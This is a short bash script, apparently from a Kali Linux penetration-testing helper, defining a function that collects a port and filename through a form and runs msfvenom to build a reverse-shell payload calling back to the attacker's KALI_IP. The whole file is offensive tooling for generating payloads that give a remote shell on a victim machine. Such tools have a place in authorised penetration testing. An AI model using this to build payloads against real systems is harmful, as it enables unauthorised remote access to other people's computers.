#!/bin/bash

create_reverse_shell() {
    local PAYLOAD="${1}"
    local FORMAT="${2}"
    local FILENAME="${3}"
    local LPORT="${4:-1337}"

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    LPORT_FIELD=$(form_item  "LPORT" "number" "LPORT" "${LPORT}")
    FILENAME_FIELD=$(form_item  "filename" "text" "filename" "${FILENAME}")

    # Generate GUI form
    generate_form "${LPORT_FIELD}" "${FILENAME_FIELD}" 

    LPORT=${form_data["LPORT"]}
    FILENAME=${form_data["filename"]}

    execute_command "msfvenom -p ${PAYLOAD} LHOST=${KALI_IP} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
    create_new_line
}
